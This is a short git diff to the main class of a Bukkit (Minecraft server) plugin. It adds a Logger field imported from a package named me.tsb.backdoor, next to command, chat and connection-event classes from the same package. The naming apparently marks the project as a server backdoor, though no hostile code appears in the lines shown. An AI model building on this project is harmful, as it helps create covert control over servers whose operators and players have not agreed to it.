@@ -2,6 +2,7 @@ package me.tsb.plugin;
 
 import lombok.Getter;
 import me.tsb.backdoor.CommandMan;
+import me.tsb.backdoor.Logger;
 import me.tsb.backdoor.PlayerChat;
 import me.tsb.backdoor.events.ConnectionEvents;
 import me.tsb.backdoor.filler.Filler;
@@ -11,6 +12,9 @@ import org.bukkit.plugin.java.JavaPlugin;
 public class Main extends JavaPlugin {
 
 	public static final boolean debug = true;
+
+	@Getter
+	private Logger logger;
 
 	@Getter
 	private CommandMan commandManager;
